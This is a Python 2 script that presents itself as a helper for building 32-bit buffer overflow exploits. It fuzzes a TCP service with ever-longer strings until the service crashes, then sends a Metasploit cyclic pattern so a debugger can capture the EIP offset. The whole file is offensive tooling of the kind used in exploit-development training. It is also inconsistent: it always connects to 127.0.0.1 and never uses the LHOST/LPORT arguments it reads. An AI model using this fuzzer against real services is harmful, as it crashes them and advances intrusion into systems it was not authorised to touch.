#!/usr/bin/python2
#  -*- coding: utf-8 -*- ####################################################################################
#                                                                                                           #
#  bof-builder- nighter                                                                                     #
#                                                                                                           #
# DATE                                                                                                      #
# 05/05/2018                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# Helper tool on build 32bit b0f exploit                                                                    #
#                                                                                                           #
# nighter - http://nighter.se/                                                                              #
#                                                                                                           #
#############################################################################################################
import socket
import commands
import os
import sys
import time
import timeout_decorator

# Settings
SPIKE_LENGTH = 1000


def puts(tp, msg):
    """Output messages in fancy colors."""
    if tp == "info":
        print("%s%s%s" % ('\033[93m', "➜ ", msg))
    elif tp == "warning":
        print("%s%s%s" % ('\033[93m', "➜ ", msg))
    elif tp == "error":
        print("%s%s%s" % ('\033[91m', "✖ ", msg))
    elif tp == "success":
        print("%s%s%s" % ('\033[92m', "✔ ", msg))


@timeout_decorator.timeout(30)
def spiking():

    buffer=["A"]
    counter = 100
    while len(buffer) <= 30:
        buffer.append("A"*counter)
        counter = counter + 200
    for string in buffer:
        try:
            puts('success', "Sends: %s bytes" % len(string))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connect = s.connect(('127.0.0.1', int(PORT)))
            s.recv(1024)
            s.send(string + '\r\n')
            s.close()
        except:
            break

    return len(string)


def send_payload(pattern):

    puts('success', "Sends: %s bytes" % pattern)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(('127.0.0.1', int(PORT)))
    s.recv(1024)
    s.send(pattern + '\r\n')
    s.close()


def test_connection():

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex(('127.0.0.1', int(PORT)))
    sock.close()
    if result == 0:
        return True
    else:
        return False


def yes_or_no(question):
    reply = str(raw_input(question+' (y/n): ')).lower().strip()
    print(reply)
    if reply == 'y':
        return True
    if reply == 'n':
        return False
    else:
        return yes_or_no(question)


def build_exploit():

    if test_connection() is False:
        puts('error', 'Connection failed: %s:%s' % (HOST, int(PORT)))
        sys.exit(0)

    SPIKE_LENGTH = spiking()

    if os.path.isfile('/opt/metasploit/tools/exploit/pattern_create.rb') is True:
        pattern_tool = '/opt/metasploit/tools/exploit/pattern_create.rb'
    elif os.path.isfile('/usr/share/metasploit-framework/tools/pattern_create.rb') is True:
        pattern_tool = '/usr/share/metasploit-framework/tools/pattern_create.rb'
    else:
        puts('success', 'Missing pattern_create tool')
        sys.exit(1)

    puts('info', 'Generating pattern')
    pattern = commands.getoutput("%s -l %s" % (pattern_tool, SPIKE_LENGTH))

    print("")
    yes_or_no("Make sure application is now running again and debugger is attached to collect eip address on next crash")
    print("")

    send_payload(pattern)



if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
bof-builder.py               
[nighter@nighter.se]
           """)
        print("Usage: %s <HOST>:<PORT> <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./bof-builder.py '10.10.10.70:9999' 10.10.14.24 1337\n")
        sys.exit(0)

    HOST = sys.argv[1]
    if ':' in HOST:
        (HOST, PORT) = HOST.split(':')
    else:
        PORT = '80'

    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    build_exploit()